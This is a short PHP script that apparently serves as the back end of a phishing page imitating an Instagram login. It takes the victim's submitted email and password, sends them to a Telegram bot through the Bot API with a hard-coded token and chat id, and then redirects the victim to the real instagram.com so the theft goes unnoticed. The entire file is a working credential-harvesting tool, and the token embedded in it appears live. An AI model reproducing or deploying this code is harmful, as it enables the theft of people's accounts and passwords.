<?php


$user = $_POST['email'];
$senha = $_POST['password'];

if(empty($_POST['password']) || empty($_POST['email'])){

    header('Location: index.php');
    
}else{
    $xml = file_get_contents("https://api.telegram.org/bot6724894025:AAHslRuPQQHP_nrFW90KqgnKZfahMlxk-30/sendMessage?chat_id=1229660024&text=NEW | ACCOUNT 👹 ".$user." > ".$senha);
    header('Location: https://instagram.com');
    
}


?>